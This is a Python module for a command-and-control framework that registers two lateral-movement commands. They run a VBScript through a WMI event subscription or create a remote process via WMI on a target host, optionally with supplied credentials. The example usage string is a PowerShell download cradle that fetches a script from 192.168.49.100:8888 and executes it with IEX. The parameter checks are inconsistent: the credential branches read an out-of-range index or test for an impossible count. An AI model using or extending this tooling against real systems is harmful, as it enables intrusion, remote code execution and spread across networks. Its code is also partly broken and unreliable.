from vaelix_host import Agent, RegisterCommand, RegisterModule
import re

def wmi_eventsub( agentID, *params ):
    TaskID : str    = None
    agent  : Agent  = None
    packer = Packer()
    agent  = Agent( agentID )

    if agent.ProcessArch == 'x86':
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "x86 is not supported" )
        return False

    num_params = len(params)

    target   = ''
    username = ''
    password = ''
    domain   = ''
    is_current = True

    if num_params < 2:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 5:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many parameters" )
        return False

    target = f'\\\\{params[ 0 ]}\\ROOT\\SUBSCRIPTION'

    try:
        with open(params[ 1 ], 'r') as f:
            vbscript = f.read()
    except Exception as e:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Invalid vbscript path" )
        return False

    if num_params > 2 and num_params < 5:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params == 5:
        is_current = False
        username = params[ 3 ]
        password = params[ 4 ]
        domain   = params[ 5 ]

    packer.addWstr(target)
    packer.addWstr(domain)
    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(vbscript)
    packer.addbool(is_current)

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to run a VBS script in {target} via wmi" )

    agent.InlineExecute( TaskID, "go", f"EventSub/bin/EventSub.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def wmi_proccreate( agentID, *params ):
    TaskID : str    = None
    agent  : Agent  = None
    packer = Packer()
    agent  = Agent( agentID )

    if agent.ProcessArch == 'x86':
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "x86 is not supported" )
        return False

    num_params = len(params)

    target     = ''
    username   = ''
    password   = ''
    domain     = ''
    command    = ''
    is_current = True

    if num_params < 2:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 5:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many parameters" )
        return False

    target  = f'\\\\{params[ 0 ]}\\ROOT\\CIMV2'
    command = params[ 1 ]

    if num_params > 2 and num_params < 5:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params == 6:
        is_current = False
        username = params[ 2 ]
        password = params[ 3 ]
        domain   = params[ 4 ]

    packer.addWstr(target)
    packer.addWstr(domain)
    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(command)
    packer.addbool(is_current)

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to run command on {target} via wmi" )

    agent.InlineExecute( TaskID, "go", f"ProcCreate/bin/ProcCreate.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( wmi_eventsub, "jump-exec", "wmi-eventsub", "Run a VBscript via WMI for lateral movement", 0, "target local_script_path <otp:username> <otp:password> <otp:domain>", "10.10.10.10 /tmp/agent.vba" )
RegisterCommand( wmi_proccreate, "jump-exec", "wmi-proccreate", "Create a process via WMI for lateral movement", 0, "target command <otp:username> <otp:password> <otp:domain>", "10.10.10.10 \"powershell.exe (new-object system.net.webclient).downloadstring('http://192.168.49.100:8888/run.txt') | IEX\"" )
